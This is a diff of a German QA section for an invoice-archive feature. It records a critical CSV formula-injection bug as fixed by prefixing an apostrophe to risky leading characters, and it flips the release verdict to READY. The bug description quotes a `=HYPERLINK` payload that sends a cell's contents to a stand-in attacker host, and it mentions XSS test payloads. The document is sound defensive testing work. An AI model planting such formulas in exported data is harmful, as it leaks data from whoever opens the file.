@@ -1,6 +1,6 @@
 # PROJ-10: Rechnungsarchiv
 
-## Status: In Progress
+## Status: Approved
 **Created:** 2026-08-17
 **Last Updated:** 2026-08-17
 
@@ -228,11 +228,13 @@ Keine neuen Fremdpakete nötig — der CSV-Export ist reiner Text (kommagetrennt
 - **XSS-Test:** `<script>`/`<img onerror>`-Payloads in Kundenname und Rechnungsbeschreibung auf der Detailseite eingespielt — React escaped korrekt, kein Skript ausgeführt.
 - **`get_advisors(security)`:** keine neuen Findings über das bereits akzeptierte Baseline-Muster hinaus (identisch zu den bestehenden PROJ-9-Funktionen).
 
-### Gefundene Bugs
+### Gefundene Bugs (behoben, siehe unten)
 
 | # | Schweregrad | Beschreibung | Reproduktion |
 |---|-------------|--------------|--------------|
-| BUG-1 | **Critical** | **CSV-Formel-Injection (CWE-1236):** Der CSV-Export escaped Felder nur nach RFC 4180 (Kommas/Anführungszeichen/Zeilenumbrüche), nicht aber gegen führende Formel-Zeichen (`=`, `+`, `-`, `@`). Der Kundenname stammt direkt aus dem frei editierbaren Profilfeld (PROJ-2, keine Zeichenbeschränkung). Ein Kunde kann seinen Namen z. B. auf `=HYPERLINK("http://evil.example/steal?x="&A1,"Klick mich")` setzen; öffnet der Admin die exportierte CSV-Datei in Excel/LibreOffice/Google Sheets, wird das als aktive Formel interpretiert und ausgeführt — potenzielles Datenleck oder (je nach Programmversion) Codeausführung auf dem Admin-Rechner. Live reproduziert: Kundenname `=1+1` erscheint unescaped als `=1+1` in der heruntergeladenen Datei. | 1. Als Kunde Profilname auf `=1+1` setzen. 2. Als Admin eine Rechnung für diesen Kunden haben (z. B. via Lastschriftlauf). 3. CSV exportieren und in Excel öffnen → Formel wird ausgewertet statt als Text angezeigt. |
+| BUG-1 | **Critical** → **Fixed** | **CSV-Formel-Injection (CWE-1236):** Der CSV-Export escapte Felder nur nach RFC 4180 (Kommas/Anführungszeichen/Zeilenumbrüche), nicht aber gegen führende Formel-Zeichen (`=`, `+`, `-`, `@`). Der Kundenname stammt direkt aus dem frei editierbaren Profilfeld (PROJ-2, keine Zeichenbeschränkung). Ein Kunde konnte seinen Namen z. B. auf `=HYPERLINK("http://evil.example/steal?x="&A1,"Klick mich")` setzen; öffnete der Admin die exportierte CSV-Datei in Excel/LibreOffice/Google Sheets, wurde das als aktive Formel interpretiert und ausgeführt — potenzielles Datenleck oder (je nach Programmversion) Codeausführung auf dem Admin-Rechner. Live reproduziert: Kundenname `=1+1` erschien unescaped als `=1+1` in der heruntergeladenen Datei. | 1. Als Kunde Profilname auf `=1+1` setzen. 2. Als Admin eine Rechnung für diesen Kunden haben (z. B. via Lastschriftlauf). 3. CSV exportieren und in Excel öffnen → Formel wurde ausgewertet statt als Text angezeigt. |
+
+**Fix (`src/lib/invoices.ts`, `toCsvField`):** Felder, die mit `=`, `+`, `-`, `@`, Tab oder Carriage-Return beginnen, bekommen zusätzlich zur bestehenden RFC-4180-Maskierung ein führendes Apostroph vorangestellt (Standard-Gegenmaßnahme gegen CSV-Formel-Injection) — Tabellenkalkulationsprogramme zeigen den Wert dann als reinen Text, nicht als Formel. Live erneut mit demselben Angriffs-Payload (`=1+1`) verifiziert: Export enthält jetzt `'=1+1` statt `=1+1`. 4 neue Vitest-Tests decken `=`, `+`, `-`, `@`-Präfixe sowie einen realistischen `=HYPERLINK(...)`-Payload ab; die volle PROJ-10-E2E-Suite (12 Tests) läuft nach dem Fix weiterhin vollständig durch.
 
 ### Regressionstests (verwandte Features)
 
@@ -243,7 +245,7 @@ Keine neuen Fremdpakete nötig — der CSV-Export ist reiner Text (kommagetrennt
 
 ### Produktionsreife-Empfehlung
 
-**NOT READY** — BUG-1 ist ein Critical-Security-Fund (aktiv ausnutzbar: jeder Kunde kann seinen eigenen Profilnamen frei setzen, der Payload landet direkt und unescaped im CSV-Export, den der Admin routinemäßig für die Buchhaltung nutzt). Muss vor dem Deployment behoben werden — Empfehlung: führende `=`, `+`, `-`, `@`, Tab oder CR in `toCsvField` mit einem vorangestellten Apostroph neutralisieren (Standard-Gegenmaßnahme für CSV-Formel-Injection), zusätzlich zur bestehenden RFC-4180-Maskierung.
+**READY** — BUG-1 (Critical) wurde auf Nutzerwunsch noch während der QA behoben, live mit demselben Angriffs-Payload verifiziert und durch neue Unit-Tests dauerhaft abgesichert. Keine offenen Critical-/High-Bugs mehr.
 
 ## Deployment
 _To be added by /deploy_
